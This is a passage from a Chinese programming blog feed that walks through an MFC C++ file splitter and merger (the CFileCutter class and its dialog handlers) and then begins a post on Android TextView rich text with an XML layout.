class="keyword">if</span>(!destFile.Open(strDestDir+sDestName,CFile::modeCreate | CFile::modeWrite))</span><br><span class="line">		&#123;</span><br><span class="line">			PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitDestErr,nCompleted);</span><br><span class="line">			sourceFile.Close();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		uWriteBytes = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!m_bContinue)<span class="comment">//判断用户是不是强制结束</span></span><br><span class="line">			&#123;</span><br><span class="line">				destFile.Close();</span><br><span class="line">				sourceFile.Close();</span><br><span class="line">				<span class="keyword">if</span> (!m_bExitThread)</span><br><span class="line">				&#123;</span><br><span class="line">					PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitUserForce,nCompleted);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//真正的进行读文件</span></span><br><span class="line">			dwRead = sourceFile.Read(Buffer,c_page);</span><br><span class="line">			destFile.Write(Buffer,dwRead);</span><br><span class="line">			uWriteBytes += dwRead;</span><br><span class="line">		&#125; <span class="keyword">while</span> (dwRead &gt; <span class="number">0</span> &amp;&amp; uWriteBytes &lt;m_uFileSize);</span><br><span class="line">		destFile.Close();</span><br><span class="line"></span><br><span class="line">		<span class="comment">//通知用户写完一个了</span></span><br><span class="line"></span><br><span class="line">		nCompleted = nPreCount++;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTATUS,<span class="number">0</span>,nCompleted);</span><br><span class="line">	&#125; <span class="keyword">while</span> (dwRead &gt; <span class="number">0</span>);<span class="comment">//这一步判断个人感觉写的很是聪明，说明这个文件读取完毕了</span></span><br><span class="line">	<span class="comment">//关闭源文件</span></span><br><span class="line">	sourceFile.Close();</span><br><span class="line">	<span class="comment">//通知用户，工作完成</span></span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSuccess,nCompleted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutter::DoMerge()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nCompleted = <span class="number">0</span>;</span><br><span class="line">	CString strSourceFile = m_strSource;</span><br><span class="line">	CString strDestDir = m_strDest;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strSourceFile.Right(<span class="number">1</span>) != <span class="string">"\\"</span>)</span><br><span class="line">		strSourceFile += <span class="string">"\\"</span>;</span><br><span class="line">	<span class="keyword">if</span> (strDestDir.Right(<span class="number">1</span>) != <span class="string">"\\"</span>)</span><br><span class="line">		strDestDir += <span class="string">"\\"</span>;</span><br><span class="line">	<span class="comment">//取得文件的名称和数量</span></span><br><span class="line"></span><br><span class="line">	CString strFileName;</span><br><span class="line">	<span class="keyword">int</span> nTotalFiles = <span class="number">0</span>;</span><br><span class="line">	CFileFind find;</span><br><span class="line">	BOOL bRet;</span><br><span class="line">	<span class="keyword">if</span> (find.FindFile(strSourceFile+<span class="string">"*.*"</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			bRet = find.FindNextFile();</span><br><span class="line">			<span class="keyword">if</span> (find.IsDirectory() &amp;&amp; find.IsDots())<span class="comment">//有点异议，一等回头看一下</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">if</span> (find.GetFileName().Find(<span class="string">"__"</span>,<span class="number">0</span>) != <span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				nTotalFiles++;</span><br><span class="line">				strFileName = find.GetFileName();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (bRet);</span><br><span class="line">	&#125;<span class="comment">//if end</span></span><br><span class="line">	find.Close();</span><br><span class="line">	<span class="keyword">if</span> (nTotalFiles == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSourceErr,nCompleted);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	strFileName = strFileName.Mid(strFileName.Find(<span class="string">"__"</span>)+<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逐级创建目标目录</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> nPos = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">while</span> ((nPos = strDestDir.Find(<span class="string">"\\"</span>,nPos+<span class="number">1</span>)) != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateDirectory(strDestDir.Left(nPos),<span class="literal">NULL</span>);<span class="comment">//有点问题一等看下</span></span><br><span class="line">	&#125;</span><br><span class="line">	CreateDirectory(strDestDir,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建目标文件</span></span><br><span class="line">	CFile sourceFile,destFile;</span><br><span class="line">	strDestDir += strFileName;</span><br><span class="line">	<span class="keyword">if</span> (!destFile.Open(strDestDir,CFile::modeReadWrite | CFile::modeCreate))</span><br><span class="line">	&#123;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitDestErr,nCompleted);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//开始合并</span></span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTART,nTotalFiles,nCompleted);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> c_page = <span class="number">1024</span>*<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">char</span> Buffer[c_page];</span><br><span class="line">	<span class="keyword">int</span> nPreCount = <span class="number">1</span>;</span><br><span class="line">	CString sSourceName;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	<span class="keyword">do</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sSourceName.Format(<span class="string">"%d__"</span>,nPreCount);</span><br><span class="line">		sSourceName += strFileName;</span><br><span class="line">		<span class="keyword">if</span>(!sourceFile.Open(strSourceFile+sSourceName,CFile::modeRead | CFile::shareDenyWrite | CFile::typeBinary))<span class="comment">//打不开失败的时候说明就没有了，这里我感觉用for循环比较好，还能提供错误处理，之后改一下。//</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 写入文件</span></span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!m_bContinue)</span><br><span class="line">			&#123;</span><br><span class="line">				sourceFile.Close();</span><br><span class="line">				destFile.Close();</span><br><span class="line">				<span class="keyword">if</span> (!m_bExitThread)</span><br><span class="line">					PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitUserForce,nCompleted);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			dwRead = sourceFile.Read(Buffer,c_page);</span><br><span class="line">			destFile.Write(Buffer,dwRead);</span><br><span class="line">		&#125; <span class="keyword">while</span> (dwRead &gt; <span class="number">0</span>);</span><br><span class="line">		sourceFile.Close();</span><br><span class="line">		nCompleted = nPreCount++;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTATUS,<span class="number">0</span>,nCompleted);</span><br><span class="line">	&#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line">	destFile.Close();</span><br><span class="line">	<span class="comment">//通知用户，工作完成</span></span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSuccess,nCompleted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实就是操作我们的文件，使用CFile这个类。<br>分割：先是打开源文件，失败的话呢投递消息，这里要POST而不是Send，然后我们再创建我们的目录，创建完毕目录之后纠正一下目标文件目录。然后我们获取一下文件理论上的道德个数，投递一个开始的消息。然后就是我们简单的初始化呢一下我们的各种信息，进入我们的循环，显示创建目标文件，创建写入的方法打开，出错的话呢就投递消息，然后在判断是不是强行终止了，强行终止的话呢我们就要关一些东西，然后投递我们的消息，然后再读源文件，在写源文件，每次读4KB，这个时候我们要读够用户传递给我们文件大小，关闭文件句柄，发送一个状态消息，一直循环，完毕之后关闭源文件，投递执行成功的消息。</p>
<p>合并：基本和我们的分割一样，显示纠正一下我们的源和目标路径，然后再找一下符合规范的文件，<code>find.IsDirectory() &amp;&amp; find.IsDots()</code>这个其实我感觉有点异议但是没碰见出错。如果一个源文件都没有，肯定要投递错误源文件的错误，在创建目录，投递一下我们要开始了，给他目标文件的大小。再就是初始化变量，进入循环打开源文件，然后判断是不是要继续，然后读写再就是和我们的分割一样了。</p>
<h2 id="类的实际调用"><a href="#类的实际调用" class="headerlink" title="类的实际调用"></a>类的实际调用</h2><p>既然我们的类写好了，实际编写的话呢无非就是类的一个调用罢了，首先我们需要配置一下我们的组件，这里就不提了，没啥太大必要，照葫芦画瓢就可以了。</p>
<h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// FileCutterDlg.h : 头文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CFileCutter.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CDirDialog.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"afxcmn.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CFileCutterDlg 对话框</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CFileCutterDlg</span> :</span> <span class="keyword">public</span> CDialogEx</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CFileCutterDlg(CWnd* pParent = <span class="literal">NULL</span>);	<span class="comment">// 标准构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对话框数据</span></span><br><span class="line">	<span class="keyword">enum</span> &#123; IDD = IDD_FILECUTTER_DIALOG &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>;	<span class="comment">// DDX/DDV 支持</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	HICON m_hIcon;</span><br><span class="line">	CFileCutter* m_pCutter;</span><br><span class="line">	CProgressCtrl m_Progress;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 生成的消息映射函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> BOOL <span class="title">OnInitDialog</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnPaint</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg HCURSOR <span class="title">OnQueryDragIcon</span><span class="params">()</span></span>;</span><br><span class="line">	DECLARE_MESSAGE_MAP()</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">UIControl</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedSelectsplit</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedSelectmergr</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedSourcebrowser</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedDestbrowser</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedStart</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedStop</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedCancel</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function">afx_msg LRESULT <span class="title">OnCutterstart</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line">	<span class="function">afx_msg LRESULT <span class="title">OnCutterstop</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line">	<span class="function">afx_msg LRESULT <span class="title">OnCutterstatus</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>就是一个简单的引入，比较关键的就是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFileCutter* m_pCutter;</span><br><span class="line">CProgressCtrl m_Progress;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UIControl</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这三个比较关键，最后一个就是用来调节UI的，其实就是判断你是不是在运行啊，是选了分割还是合并啊之类的。</p>
<h3 id="源文件"><a href="#源文件" class="headerlink" title="源文件"></a>源文件</h3><p><code>CFileCutterDlg::OnInitDialog()</code>初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">m_pCutter = <span class="keyword">new</span> CFileCutter(m_hWnd);</span><br><span class="line">((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;SetCheck(<span class="number">1</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;AddString(<span class="string">"1"</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;AddString(<span class="string">"30"</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;AddString(<span class="string">"60"</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;SetCurSel(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//m_Progress.SubclassWindow(GetDlgItem(IDC_PROGRESS)-&gt;m_hWnd);</span></span><br><span class="line">UIControl();</span><br></pre></td></tr></table></figure>
<p>这里之前用了子类化控件的一个方法，但我实在没看到用的必要我就给注释，（其实主要是我发现报错，哈哈）<br><code>UIControl</code>函数的实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::UIControl(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	BOOL bIsWorking = m_pCutter-&gt;IsRunning();</span><br><span class="line">	GetDlgItem(IDC_SELECTSPLIT)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line">	GetDlgItem(IDC_SELECTMERGR)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line">	GetDlgItem(IDC_UINT)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line"></span><br><span class="line">	GetDlgItem(IDC_START)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line">	GetDlgItem(IDC_STOP)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bIsWorking)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;GetCheck())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//分割</span></span><br><span class="line">		GetDlgItem(IDC_START)-&gt;SetWindowText(<span class="string">"分割"</span>);</span><br><span class="line">		GetDlgItem(IDC_SOURCETITLE)-&gt;SetWindowText(<span class="string">"请选择要分割的文件："</span>);</span><br><span class="line">		GetDlgItem(IDC_DESTTITLE)-&gt;SetWindowText(<span class="string">"请选择分割后保存到的文件夹"</span>);</span><br><span class="line">		GetDlgItem(IDC_UINT)-&gt;EnableWindow(TRUE);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//合并</span></span><br><span class="line">		GetDlgItem(IDC_START)-&gt;SetWindowText(<span class="string">"合并"</span>);</span><br><span class="line">		GetDlgItem(IDC_SOURCETITLE)-&gt;SetWindowText(<span class="string">"请选择要合并的文件夹："</span>);</span><br><span class="line">		GetDlgItem(IDC_DESTTITLE)-&gt;SetWindowText(<span class="string">"请选择合并后保存到的文件夹"</span>);</span><br><span class="line">		GetDlgItem(IDC_UINT)-&gt;EnableWindow(FALSE);</span><br><span class="line">	&#125;</span><br><span class="line">	GetDlgItem(IDC_STATUSTEXT)-&gt;SetWindowText(<span class="string">"状态显示"</span>);</span><br><span class="line">	m_Progress.SetPos(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个的话呢其实也看起来不是很难，就是通过我们的类成员函数判断是不是在运行，是选择的分割还是合并，然后初始化一些控件。</p>
<p>单选框按钮被按下的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedSelectsplit()</span><br><span class="line">&#123;</span><br><span class="line">	UIControl();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedSelectmergr()</span><br><span class="line">&#123;</span><br><span class="line">	UIControl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是当按单选框按钮被按下的时候我们进行的操作，就是用来刷新一下我们的一些UI。</p>
<p>当我们点击选择文件夹的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedSourcebrowser()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;GetCheck())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//分割</span></span><br><span class="line">		<span class="function">CFileDialog <span class="title">sourceFile</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">		<span class="keyword">if</span> (sourceFile.DoModal() == IDOK)</span><br><span class="line">		&#123;</span><br><span class="line">			GetDlgItem(IDC_EDITSOURCE)-&gt;SetWindowText(sourceFile.GetPathName());</span><br><span class="line">			GetDlgItem(IDC_EDITDEST)-&gt;SetWindowText(sourceFile.GetPathName().Left(sourceFile.GetPathName().ReverseFind(<span class="string">'.'</span>)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//合并</span></span><br><span class="line">		CDirDialog sourceFolder;</span><br><span class="line">		<span class="keyword">if</span> (sourceFolder.DoBrowse(*<span class="keyword">this</span>) == IDOK)</span><br><span class="line">		&#123;</span><br><span class="line">			GetDlgItem(IDC_EDITSOURCE)-&gt;SetWindowText(sourceFolder.GetDirPath());</span><br><span class="line">			CString strDef = sourceFolder.GetDirPath();</span><br><span class="line">			strDef.TrimRight(<span class="string">'\\'</span>);</span><br><span class="line">			strDef = strDef + <span class="string">"\\"</span> + strDef.Mid(strDef.ReverseFind(<span class="string">'\\'</span>)+<span class="number">1</span>);</span><br><span class="line">			strDef.TrimRight(<span class="string">":"</span>);<span class="comment">//防止选择根目录</span></span><br><span class="line">			GetDlgItem(IDC_EDITDEST)-&gt;SetWindowText(strDef);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedDestbrowser()</span><br><span class="line">&#123;</span><br><span class="line">	CDirDialog destFolder;</span><br><span class="line">	<span class="keyword">if</span> (destFolder.DoBrowse(*<span class="keyword">this</span>) == IDOK)</span><br><span class="line">	&#123;</span><br><span class="line">		GetDlgItem(IDC_EDITDEST)-&gt;SetWindowText(destFolder.GetDirPath());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个当我们点击源文件的时候我们就是先判断是风格还是合并，分割的话呢就是文件对话框，合并的话呢就是我们自己写的那个类，不要忘记导入就好了。然后比较聪明的就是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">strDef = strDef + <span class="string">"\\"</span> + strDef.Mid(strDef.ReverseFind(<span class="string">'\\'</span>)+<span class="number">1</span>);</span><br><span class="line">strDef.TrimRight(<span class="string">":"</span>);<span class="comment">//防止选择根目录</span></span><br></pre></td></tr></table></figure>
<p>这两句，就是生成一个与我们文件夹相同的子文件夹，然后防止了这个根目录（F:\）。</p>
<p>再就是我们点击分割开始的按钮的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedStart()</span><br><span class="line">&#123;</span><br><span class="line">	CString strSource,strDest;</span><br><span class="line">	GetDlgItem(IDC_EDITSOURCE)-&gt;GetWindowText(strSource);</span><br><span class="line">	GetDlgItem(IDC_EDITDEST)-&gt;GetWindowText(strDest);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strSource.IsEmpty() || strDest.IsEmpty())</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"文件或者文件路径不能为空"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;GetCheck())</span><br><span class="line">	&#123;</span><br><span class="line">		CString str;</span><br><span class="line">		GetDlgItem(IDC_UINT)-&gt;GetWindowText(str);</span><br><span class="line">		m_pCutter-&gt;StartSplit(strDest,strSource,atoi(str)*<span class="number">1024</span>*<span class="number">1024</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_pCutter-&gt;StartMerge(strDest,strSource);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedStop()</span><br><span class="line">&#123;</span><br><span class="line">	m_pCutter-&gt;SuspendCutter();</span><br><span class="line">	<span class="keyword">if</span> (MessageBox(<span class="string">"确定要终止么?"</span>,<span class="literal">NULL</span>,MB_YESNO) == IDYES)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pCutter-&gt;StopCutter();</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_pCutter-&gt;ResumeCutter();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显示判断是否有填写源文件与目标文件夹，然后判断是分割还是合并，最后调用类的开始方法进行操作。</p>
<p>最后就是我们的消息映射：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">afx_msg LRESULT CFileCutterDlg::OnCutterstart(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//设置进度条范围</span></span><br><span class="line">	<span class="keyword">int</span> nTotalFiles = wParam;</span><br><span class="line">	m_Progress.SetRange32(<span class="number">0</span>,nTotalFiles);</span><br><span class="line">	UIControl();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">afx_msg LRESULT CFileCutterDlg::OnCutterstop(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nErrorCode = wParam;</span><br><span class="line">	<span class="keyword">switch</span>(nErrorCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitSuccess:</span><br><span class="line">		MessageBox(<span class="string">"操作成功完成"</span>,<span class="string">"成功"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitSourceErr:</span><br><span class="line">		MessageBox(<span class="string">"源文件出错"</span>,<span class="string">"失败"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitDestErr:</span><br><span class="line">		MessageBox(<span class="string">"目标出错"</span>,<span class="string">"失败"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitUserForce:</span><br><span class="line">		MessageBox(<span class="string">"用户终止"</span>,<span class="string">"失败"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	UIControl();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">afx_msg LRESULT CFileCutterDlg::OnCutterstatus(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nCompleted = <span class="keyword">int</span> (lParam);</span><br><span class="line">	m_Progress.SetPos(nCompleted);</span><br><span class="line">	CString s;</span><br><span class="line">	s.Format(<span class="string">"完成%d个文件"</span>,nCompleted);</span><br><span class="line">	GetDlgItem(IDC_STATUSTEXT)-&gt;SetWindowText(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效应映射需要我们在类向导中进行声明，不用类向导的话呢要自己写声明和消息映射。<br>接受到开始的时候，我们需要设置进度条，然后初始化UI，停止的话呢我们要进行停止原因的判断，状态的话呢无非就是完成个数的输出。</p>
<h2 id="程序的不足"><a href="#程序的不足" class="headerlink" title="程序的不足"></a>程序的不足</h2><ol>
<li>首先我们是在合并的时候我感觉用for循环更好一些</li>
<li>这个要是能用文件映射的话呢应该可以处理更大的文件。</li>
</ol>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android TextView实现富文本</title>
    <url>/2020/02/01/Android-TextView%E5%AE%9E%E7%8E%B0%E5%AF%8C%E6%96%87%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="TextView实现富文本"><a href="#TextView实现富文本" class="headerlink" title="TextView实现富文本"></a>TextView实现富文本</h2><p>这个的话呢其实也是不是太难的一个操作，就是基本的加入文本，但是加入的不是简单的String类型，而是实现CharSquence接口的一个类。<br>这个好像就是用来添加富文本的，首先我们先配置XML</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.example.android_stduy1.MainActivity"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Tv_One"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Tv_Two"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@+id/Tv_One"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:autoLink</span>=<span class="string">"all"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
